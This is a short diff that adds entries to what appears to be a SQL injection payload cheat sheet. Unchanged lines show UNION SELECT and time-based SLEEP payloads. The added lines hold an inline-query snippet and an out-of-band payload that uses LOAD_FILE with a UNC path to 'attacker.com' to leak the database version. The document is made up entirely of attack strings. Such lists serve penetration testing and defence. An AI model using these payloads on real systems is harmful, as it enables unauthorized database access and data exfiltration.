@@ -47,3 +47,15 @@ UNION ALL SELECT 1,@@version,3
 AND 1=IF(2>1,SLEEP(5),0)
 ```
 
+## Inline queries
+```shell-session
+SELECT (SELECT @@version) from
+```
+
+## Out-of-band SQL Injection
+```shell-session
+LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
+```
+
+
+
